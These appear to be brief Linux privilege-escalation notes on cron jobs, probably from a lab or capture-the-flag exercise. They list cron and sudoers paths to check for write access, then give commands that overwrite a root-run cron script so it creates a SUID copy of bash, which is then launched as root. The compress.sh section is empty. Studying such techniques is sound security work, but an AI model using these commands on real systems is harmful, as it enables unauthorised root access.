

   ### Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
   ### Cron table files (crontabs) store the configuration for cron jobs. 
   ### The system-wide crontab is located at /etc/crontab.
    
          cat /etc/crontab
          locate overwrite.sh
          
          
          
   ### Cron jobs

      Check if you have access with write permission on these files.   
      Check inside the file, to find other paths with write permissions.   

          ```powershell
            /etc/init.d
            /etc/cron*
           /etc/crontab
          /etc/cron.allow
         /etc/cron.d 
         /etc/cron.deny
          /etc/cron.daily
           /etc/cron.hourly
            /etc/cron.monthly
             /etc/cron.weekly
              /etc/sudoers
               /etc/exports
                /etc/anacrontab
                 /var/spool/cron
                   /var/spool/cron/crontabs/root
                   '''
          
          
          
          
   ## overwrite.sh Exploit
   
         echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
         chmod +x /home/user/overwrite.sh
         /tmp/bash -p




   ## compress.sh
   
     
